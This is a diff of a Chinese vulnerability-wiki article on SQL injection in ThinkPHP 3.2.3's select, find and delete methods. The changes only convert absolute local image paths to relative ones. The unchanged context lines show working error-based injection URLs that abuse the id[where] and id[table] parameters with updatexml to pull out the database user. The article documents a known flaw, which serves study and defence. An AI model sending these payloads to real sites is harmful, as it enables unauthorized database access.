@@ -19,15 +19,15 @@ Thinkphp 3.2.3 select&find&delete 注入漏洞
 
 `delete`函数
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId25.png)
+![](./.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId25.png)
 
 `select`函数
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId26.png)
+![](./.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId26.png)
 
 `find`函数
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId27.png)
+![](./.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId27.png)
 
 对比三个方法修改的地方都有一个共同点：
 
@@ -180,7 +180,7 @@ Thinkphp 3.2.3 select&find&delete 注入漏洞
 
     where: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId31.png)
+![](./.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId31.png)
 
 而`delete()`方法的话同样，这里粗略举三个例子，`table`,`alias`,`where`，但使用`table`和`alias`的时候，同时还必须保证`where`不为空（详细原因后面会说）
 
@@ -190,7 +190,7 @@ Thinkphp 3.2.3 select&find&delete 注入漏洞
 
     table: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&id[where]=1
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId32.png)
+![](./.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId32.png)
 
 参考链接
 --------
